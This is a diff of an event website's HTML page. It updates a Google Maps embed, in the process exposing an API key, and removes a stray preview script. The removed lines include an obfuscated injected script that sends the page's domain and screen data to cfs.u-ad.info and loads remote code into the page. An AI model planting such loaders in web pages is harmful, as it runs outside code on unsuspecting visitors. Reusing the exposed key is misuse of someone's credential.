@@ -1573,11 +1573,20 @@
 
             <h2> Event Map </h2> <!-- = Title just for SEO = -->
 
-            <script src="https://maps.googleapis.com/maps/api/js?v=3.exp&amp;signed_in=true"></script>
 
             <!-- ================= GOOGLE MAPS COORDINATES ================= -->
 
-            <div id="map-canvas" class="map-canvas"> </div>
+            <div id="map" class="map-canvas"> </div>
+            <script>
+                var map;
+                function initMap() {
+                    map = new google.maps.Map(document.getElementById('map'), {
+                        center: {lat: -7.9521422, lng: 112.5432265},
+                        zoom: 20
+                    });
+                }
+            </script>
+            <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBbTYczntXnux1N_HyvmNBnmEKaMRF4_ow&callback=initMap" async defer></script>
 
         </section>
 
@@ -1826,9 +1835,6 @@
     <script src="js/wow.min.js"></script>
     <script src="js/fancyselect.js"></script>
     <script src="js/_main.js"></script>
-      
-    <!-- Only Preview -->
-        <script src="js/styleswitcher.js"></script>
-  
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnv53M1P9YiIjcOK%2bStvYAKvuoq%2fl2XG%2bWomy3tZF4sZgH%2bkJV1qiGLU0rNdORsdoPRgesFHvXT%2faMxjLCk6ZsKpijJp2jH34Vv7DP%2b8QEDtBqemzjloU6wj3KZVM1fRofJ%2fjZrlRMKrHnYTRtsmMbcl8rB0k9Bb6bha4k6yHTQFpNHW8b02s2rh1sY%2fM9NIlJBMc%2fCmiEQVOm5wQhT%2b5KbExEG%2fg9uu9IHQRxN4g8xKMzSR7TLx%2fHvK5hqEF3OWEFWJzYjWaIrb9WHUKIPEA0eQaeukez%2fR6550nQPun3CWH%2fm0ay8kxAOhHUYZFgWKhxPbNlAD3mPQd9Y0QR08eoGoDKq7c1QSuDbvHPNNpQ3mkt5nUO1MhrCIvtHcwIVVkzxQhJ8g080ppjpQsW8YMFgUZaPkFrstzyU2JC6AhHYBnHPTWAiglWIOTuvceLHqSw3gMtoAnJ1A1sIEIvhyJ6hVgDPbFK15WvsaGIoCk2d4c%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+</body>
 </html>
